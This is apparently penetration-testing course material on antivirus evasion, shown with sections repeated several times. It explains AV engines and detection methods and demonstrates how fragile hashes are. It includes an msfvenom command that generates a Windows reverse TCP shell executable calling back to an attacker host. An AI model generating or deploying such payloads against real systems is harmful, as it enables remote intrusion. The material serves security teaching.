At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet. Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines.

A modern antivirus is typically designed around the following components:

-   File Engine
-   Memory Engine
-   Network Engine
-   Disassembler
-   Emulator/Sandbox
-   Browser Plugin
-   Machine Learning Engine

Each of the engines above work simultaneously with the signature database to rank specific events as either benign, malicious, or unknown.

The _file engine_ is responsible for both scheduled and real-time file scans. When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website. To detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted [_mini-filter driver_](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts). This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire operating system scope.

The _memory engine_ inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks, as we'll find shortly.

As the name suggests, the _network engine_ inspects the incoming and outgoing network traffic on the local network interface. Once a signature is matched, a network engine might attempt to block the malware from communicating with its [_Command and Control_](https://en.wikipedia.org/wiki/Botnet#Command_and_control) (C2) server.

To further hinder detection, malware often employs encryption and decryption through custom routines to conceal its true nature. AVs counterattack this strategy by _disassembling_ the malware packers or ciphers and loading the malware into a sandbox, or _emulator_.

The _disassembler_ engine is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. A _sandbox_ is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system. Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature.

As browsers are protected by the sandbox, modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

Additionally, the machine learning component is becoming a vital part of current AVs as it enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.

## 15.1.3. Detection Methods

As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they have been built for, but they still serve the same purpose of uniquely identifying a specific threat or malware.

In this section, we are going to explore the following AV detection methodologies and explain how they work together.

-   Signature-based Detection
-   Heuristic-based Detection
-   Behavioral Detection
-   Machine Learning Detection

_Signature-based_ antivirus detection is mostly considered a _restricted list technology_. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware.

Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash.

As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the [_xxd_](https://linux.die.net/man/1/xxd) tool by passing the **\-b** argument before the file name.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010                                               .
```

> Listing 1 - Inspecting the binary file content with xxd

We displayed the content of the file through the xxd utility. The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one. We have also highlighted the binary representation of the letter "c" in red. Its purpose will become clear shortly.

Now, assuming this is real malware, we want to calculate the hash of the file, and we can do so through the **sha256sum** utility.

```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

> Listing 2 - Calculating the SHA256 hash of the file

Let's now replace the last letter of the "offsec" string with a capital **C** and dump its binary value via xxd once more.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

> Listing 3 - Inspecting the file content with xxd

In listing 3, we notice that the binary value of the last letter is changed only in its third bit from the left.

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, let's calculate the SHA256 hash on the modified string.

```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

> Listing 4 - Calculating the SHA256 hash on the modified file

Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections.

To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products.

[_Heuristic-Based Detection_](https://en.wikipedia.org/wiki/Heuristic_analysis) is a detection method that relies on various rules and algorithms to determine if an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

Alternatively, [_Behavior-Based Detection_](https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf) dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.

Lastly, _Machine-Learning Detection_ aims to up the game by introducing ML algorithms to detect unknown threats by collecting and [_analyzing additional metadata_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/cloud-protection-microsoft-antivirus-sample-submission?view=o365-worldwide). For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the [_submitted samples_](https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf). Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively. Given that antivirus manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each antivirus product will differ in terms of what code is considered malicious.

It's worth noting that many antivirus developers use a combination of these detection methods to achieve higher detection rates.

To demonstrate the effectiveness of various antivirus products, we will start by scanning a popular _Metasploit_ payload. Using _msfvenom_, we will generate a standard [_Portable Executable_](https://en.wikipedia.org/wiki/Portable_Executable) (PE) file containing our payload. In this case we will use a simple TCP reverse shell.

The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the [_Windows Loader_](https://en.wikipedia.org/wiki/Loader_(computing)) to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

Before generating any Metasploit payloads, it is a best practice to make sure we are running the latest version of Kali. Metasploit gets updated frequently and its AV signatures could change as well. AV vendors must rebuild those signatures and push them as updates. This constant and intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a penetration test, since a fresh Metasploit version might run undetected due to stale AV signatures.

Let's generate the test binary payload by running the **msfvenom** command followed by the **\-p** argument specifying the payload. We'll then pass the reverse shell local host (**LHOST**) and local port (**LPORT**) arguments along with the **EXE** file format and redirect the output to a file named **binary.exe**.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

> Listing 5 - Generating a malicious PE containing a meterpreter shell.

Next, we will run a virus scan on this executable. Rather than installing many antivirus applications on our local machine, we can upload our file to [_VirusTotal_](https://www.virustotal.com/#/home/upload), which will scan it to determine the detection rate of various AV products.

VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.

The results of this scan are listed below.

![Figure 1: Virustotal results on the msfvenom payload.](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/9a05cfc8fe2cd0438b9b48b03c79ed23-antivirus_evasion_01b.png)

Figure 1: Virustotal results on the msfvenom payload.

We'll notice in our results that many antivirus products determined our file is malicious based on the different detection mechanisms we have illustrated in this section.

In this Learning Unit, we have explored the different components that constitute a modern AV and covered the various strategies adopted to detect malicious software.

In the next Learning Unit, we are going to make use of this knowledge and learn the different mechanisms that enable attackers to evade antivirus detections.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Antivirus Evasion - AV Components and Operations - VM #1

#### Labs

1.  Which AV engine is responsible for translating machine code into assembly?

Answer

# 15\. Antivirus Evasion

In this Module, we will cover the following Learning Units:

-   Antivirus Software Key Components and Operations
-   Bypassing Antivirus Detections
-   Antivirus Evasion in Practice

To compromise a target machine, attackers often disable or otherwise bypass antivirus software installed on these systems. As penetration testers, we must understand and be able to recreate these techniques to demonstrate this potential threat to our client.

In this Module, we will discuss the purpose of antivirus software, discover how it works, and outline how it is deployed in most companies. We will examine various methods used to detect malicious software and explore some of the available tools and techniques that will allow us to bypass AV software on target machines.

## 15.1. Antivirus Software Key Components and Operations

This Learning Unit covers the following Learning Objectives:

-   Recognize Known vs Unknown Threats
-   Understand AV Key Components
-   Understand AV Detection Engines

[_Antivirus_](https://en.wikipedia.org/wiki/Antivirus_software) (AV), is a type of application designed to prevent, detect, and remove malicious software. It was originally designed to simply remove computer viruses. However, with the development of new types of malware, like bots and [_ransomware_](https://www.crowdstrike.com/cybersecurity-101/malware/types-of-malware/), antivirus software now typically includes additional protections such as [_IDS/IPS_](https://en.wikipedia.org/wiki/Intrusion_detection_system), firewall, website scanners, and more.

## 15.1.1. Known vs Unknown Threats

In its original design, an antivirus software bases its operation and decisions on signatures. The goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match. As we'll discover in the following section, an AV comprises different engines responsible for detecting and analyzing specific components of the running system.

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engine. For example, two signatures can be developed to contrast the exact same type of malware: one to target the malware file on disk and another to detect its network communication. The semantics of the two signatures can vary drastically as they are intended for two different AV engines. In 2014, a signature language named [_YARA_](https://en.wikipedia.org/wiki/YARA) was open-sourced to allow researchers to query the [_VirusTotal_](https://www.virustotal.com/#/home/upload) platform or even integrate their own malware signatures into AV products. VirusTotal is a malware search engine that allows users to search known malware or submit new samples and scan them against several AV products.

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented. However, modern AV solutions, including [_Windows Defender_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows?view=o365-worldwide), are shipped with a [_Machine Learning_](https://www.microsoft.com/security/blog/2017/08/03/windows-defender-atp-machine-learning-detecting-new-and-unusual-breach-activity/) (ML) engine that is queried whenever an unknown file is discovered on a system. These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers. Moreover, the many engines that constitute an AV should not borrow too many computing resources from the rest of the system as it could impact the system's usability.

To overcome these AV limitations, [_Endpoint Detection and Response_](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (EDR) solutions have evolved during recent years. EDR software is responsible for generating security-event telemetry and forwarding it to a [_Security Information and Event Management_](https://en.wikipedia.org/wiki/Security_information_and_event_management) (SIEM) system, which collects data from every company host. These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection. Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture.

## 15.1.2. AV Engines and Components

At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet. Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines.

A modern antivirus is typically designed around the following components:

-   File Engine
-   Memory Engine
-   Network Engine
-   Disassembler
-   Emulator/Sandbox
-   Browser Plugin
-   Machine Learning Engine

Each of the engines above work simultaneously with the signature database to rank specific events as either benign, malicious, or unknown.

The _file engine_ is responsible for both scheduled and real-time file scans. When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website. To detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted [_mini-filter driver_](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts). This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire operating system scope.

The _memory engine_ inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks, as we'll find shortly.

As the name suggests, the _network engine_ inspects the incoming and outgoing network traffic on the local network interface. Once a signature is matched, a network engine might attempt to block the malware from communicating with its [_Command and Control_](https://en.wikipedia.org/wiki/Botnet#Command_and_control) (C2) server.

To further hinder detection, malware often employs encryption and decryption through custom routines to conceal its true nature. AVs counterattack this strategy by _disassembling_ the malware packers or ciphers and loading the malware into a sandbox, or _emulator_.

The _disassembler_ engine is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. A _sandbox_ is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system. Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature.

As browsers are protected by the sandbox, modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

Additionally, the machine learning component is becoming a vital part of current AVs as it enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.

## 15.1.3. Detection Methods

As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they have been built for, but they still serve the same purpose of uniquely identifying a specific threat or malware.

In this section, we are going to explore the following AV detection methodologies and explain how they work together.

-   Signature-based Detection
-   Heuristic-based Detection
-   Behavioral Detection
-   Machine Learning Detection

_Signature-based_ antivirus detection is mostly considered a _restricted list technology_. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware.

Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash.

As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the [_xxd_](https://linux.die.net/man/1/xxd) tool by passing the **\-b** argument before the file name.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010                                               .
```

> Listing 1 - Inspecting the binary file content with xxd

We displayed the content of the file through the xxd utility. The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one. We have also highlighted the binary representation of the letter "c" in red. Its purpose will become clear shortly.

Now, assuming this is real malware, we want to calculate the hash of the file, and we can do so through the **sha256sum** utility.

```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

> Listing 2 - Calculating the SHA256 hash of the file

Let's now replace the last letter of the "offsec" string with a capital **C** and dump its binary value via xxd once more.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

> Listing 3 - Inspecting the file content with xxd

In listing 3, we notice that the binary value of the last letter is changed only in its third bit from the left.

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, let's calculate the SHA256 hash on the modified string.

```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

> Listing 4 - Calculating the SHA256 hash on the modified file

Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections.

To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products.

[_Heuristic-Based Detection_](https://en.wikipedia.org/wiki/Heuristic_analysis) is a detection method that relies on various rules and algorithms to determine if an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

Alternatively, [_Behavior-Based Detection_](https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf) dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.

Lastly, _Machine-Learning Detection_ aims to up the game by introducing ML algorithms to detect unknown threats by collecting and [_analyzing additional metadata_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/cloud-protection-microsoft-antivirus-sample-submission?view=o365-worldwide). For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the [_submitted samples_](https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf). Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively. Given that antivirus manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each antivirus product will differ in terms of what code is considered malicious.

It's worth noting that many antivirus developers use a combination of these detection methods to achieve higher detection rates.

To demonstrate the effectiveness of various antivirus products, we will start by scanning a popular _Metasploit_ payload. Using _msfvenom_, we will generate a standard [_Portable Executable_](https://en.wikipedia.org/wiki/Portable_Executable) (PE) file containing our payload. In this case we will use a simple TCP reverse shell.

The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the [_Windows Loader_](https://en.wikipedia.org/wiki/Loader_(computing)) to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

Before generating any Metasploit payloads, it is a best practice to make sure we are running the latest version of Kali. Metasploit gets updated frequently and its AV signatures could change as well. AV vendors must rebuild those signatures and push them as updates. This constant and intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a penetration test, since a fresh Metasploit version might run undetected due to stale AV signatures.

Let's generate the test binary payload by running the **msfvenom** command followed by the **\-p** argument specifying the payload. We'll then pass the reverse shell local host (**LHOST**) and local port (**LPORT**) arguments along with the **EXE** file format and redirect the output to a file named **binary.exe**.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

> Listing 5 - Generating a malicious PE containing a meterpreter shell.

Next, we will run a virus scan on this executable. Rather than installing many antivirus applications on our local machine, we can upload our file to [_VirusTotal_](https://www.virustotal.com/#/home/upload), which will scan it to determine the detection rate of various AV products.

VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.

The results of this scan are listed below.

![Figure 1: Virustotal results on the msfvenom payload.](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/9a05cfc8fe2cd0438b9b48b03c79ed23-antivirus_evasion_01b.png)

Figure 1: Virustotal results on the msfvenom payload.

We'll notice in our results that many antivirus products determined our file is malicious based on the different detection mechanisms we have illustrated in this section.

In this Learning Unit, we have explored the different components that constitute a modern AV and covered the various strategies adopted to detect malicious software.

In the next Learning Unit, we are going to make use of this knowledge and learn the different mechanisms that enable attackers to evade antivirus detections.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Antivirus Evasion - AV Components and Operations - VM #1

#### Labs

1.  Which AV engine is responsible for translating machine code into assembly?

Answer

# 15\. Antivirus Evasion

In this Module, we will cover the following Learning Units:

-   Antivirus Software Key Components and Operations
-   Bypassing Antivirus Detections
-   Antivirus Evasion in Practice

To compromise a target machine, attackers often disable or otherwise bypass antivirus software installed on these systems. As penetration testers, we must understand and be able to recreate these techniques to demonstrate this potential threat to our client.

In this Module, we will discuss the purpose of antivirus software, discover how it works, and outline how it is deployed in most companies. We will examine various methods used to detect malicious software and explore some of the available tools and techniques that will allow us to bypass AV software on target machines.

## 15.1. Antivirus Software Key Components and Operations

This Learning Unit covers the following Learning Objectives:

-   Recognize Known vs Unknown Threats
-   Understand AV Key Components
-   Understand AV Detection Engines

[_Antivirus_](https://en.wikipedia.org/wiki/Antivirus_software) (AV), is a type of application designed to prevent, detect, and remove malicious software. It was originally designed to simply remove computer viruses. However, with the development of new types of malware, like bots and [_ransomware_](https://www.crowdstrike.com/cybersecurity-101/malware/types-of-malware/), antivirus software now typically includes additional protections such as [_IDS/IPS_](https://en.wikipedia.org/wiki/Intrusion_detection_system), firewall, website scanners, and more.

## 15.1.1. Known vs Unknown Threats

In its original design, an antivirus software bases its operation and decisions on signatures. The goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match. As we'll discover in the following section, an AV comprises different engines responsible for detecting and analyzing specific components of the running system.

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engine. For example, two signatures can be developed to contrast the exact same type of malware: one to target the malware file on disk and another to detect its network communication. The semantics of the two signatures can vary drastically as they are intended for two different AV engines. In 2014, a signature language named [_YARA_](https://en.wikipedia.org/wiki/YARA) was open-sourced to allow researchers to query the [_VirusTotal_](https://www.virustotal.com/#/home/upload) platform or even integrate their own malware signatures into AV products. VirusTotal is a malware search engine that allows users to search known malware or submit new samples and scan them against several AV products.

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented. However, modern AV solutions, including [_Windows Defender_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows?view=o365-worldwide), are shipped with a [_Machine Learning_](https://www.microsoft.com/security/blog/2017/08/03/windows-defender-atp-machine-learning-detecting-new-and-unusual-breach-activity/) (ML) engine that is queried whenever an unknown file is discovered on a system. These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers. Moreover, the many engines that constitute an AV should not borrow too many computing resources from the rest of the system as it could impact the system's usability.

To overcome these AV limitations, [_Endpoint Detection and Response_](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (EDR) solutions have evolved during recent years. EDR software is responsible for generating security-event telemetry and forwarding it to a [_Security Information and Event Management_](https://en.wikipedia.org/wiki/Security_information_and_event_management) (SIEM) system, which collects data from every company host. These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection. Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture.

## 15.1.2. AV Engines and Components

At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet. Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines.

A modern antivirus is typically designed around the following components:

-   File Engine
-   Memory Engine
-   Network Engine
-   Disassembler
-   Emulator/Sandbox
-   Browser Plugin
-   Machine Learning Engine

Each of the engines above work simultaneously with the signature database to rank specific events as either benign, malicious, or unknown.

The _file engine_ is responsible for both scheduled and real-time file scans. When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website. To detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted [_mini-filter driver_](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts). This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire operating system scope.

The _memory engine_ inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks, as we'll find shortly.

As the name suggests, the _network engine_ inspects the incoming and outgoing network traffic on the local network interface. Once a signature is matched, a network engine might attempt to block the malware from communicating with its [_Command and Control_](https://en.wikipedia.org/wiki/Botnet#Command_and_control) (C2) server.

To further hinder detection, malware often employs encryption and decryption through custom routines to conceal its true nature. AVs counterattack this strategy by _disassembling_ the malware packers or ciphers and loading the malware into a sandbox, or _emulator_.

The _disassembler_ engine is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. A _sandbox_ is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system. Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature.

As browsers are protected by the sandbox, modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

Additionally, the machine learning component is becoming a vital part of current AVs as it enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.

## 15.1.3. Detection Methods

As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they have been built for, but they still serve the same purpose of uniquely identifying a specific threat or malware.

In this section, we are going to explore the following AV detection methodologies and explain how they work together.

-   Signature-based Detection
-   Heuristic-based Detection
-   Behavioral Detection
-   Machine Learning Detection

_Signature-based_ antivirus detection is mostly considered a _restricted list technology_. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware.

Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash.

As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the [_xxd_](https://linux.die.net/man/1/xxd) tool by passing the **\-b** argument before the file name.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010                                               .
```

> Listing 1 - Inspecting the binary file content with xxd

We displayed the content of the file through the xxd utility. The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one. We have also highlighted the binary representation of the letter "c" in red. Its purpose will become clear shortly.

Now, assuming this is real malware, we want to calculate the hash of the file, and we can do so through the **sha256sum** utility.

```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

> Listing 2 - Calculating the SHA256 hash of the file

Let's now replace the last letter of the "offsec" string with a capital **C** and dump its binary value via xxd once more.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

> Listing 3 - Inspecting the file content with xxd

In listing 3, we notice that the binary value of the last letter is changed only in its third bit from the left.

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, let's calculate the SHA256 hash on the modified string.

```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

> Listing 4 - Calculating the SHA256 hash on the modified file

Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections.

To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products.

[_Heuristic-Based Detection_](https://en.wikipedia.org/wiki/Heuristic_analysis) is a detection method that relies on various rules and algorithms to determine if an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

Alternatively, [_Behavior-Based Detection_](https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf) dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.

Lastly, _Machine-Learning Detection_ aims to up the game by introducing ML algorithms to detect unknown threats by collecting and [_analyzing additional metadata_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/cloud-protection-microsoft-antivirus-sample-submission?view=o365-worldwide). For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the [_submitted samples_](https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf). Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively. Given that antivirus manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each antivirus product will differ in terms of what code is considered malicious.

It's worth noting that many antivirus developers use a combination of these detection methods to achieve higher detection rates.

To demonstrate the effectiveness of various antivirus products, we will start by scanning a popular _Metasploit_ payload. Using _msfvenom_, we will generate a standard [_Portable Executable_](https://en.wikipedia.org/wiki/Portable_Executable) (PE) file containing our payload. In this case we will use a simple TCP reverse shell.

The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the [_Windows Loader_](https://en.wikipedia.org/wiki/Loader_(computing)) to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

Before generating any Metasploit payloads, it is a best practice to make sure we are running the latest version of Kali. Metasploit gets updated frequently and its AV signatures could change as well. AV vendors must rebuild those signatures and push them as updates. This constant and intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a penetration test, since a fresh Metasploit version might run undetected due to stale AV signatures.

Let's generate the test binary payload by running the **msfvenom** command followed by the **\-p** argument specifying the payload. We'll then pass the reverse shell local host (**LHOST**) and local port (**LPORT**) arguments along with the **EXE** file format and redirect the output to a file named **binary.exe**.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

> Listing 5 - Generating a malicious PE containing a meterpreter shell.

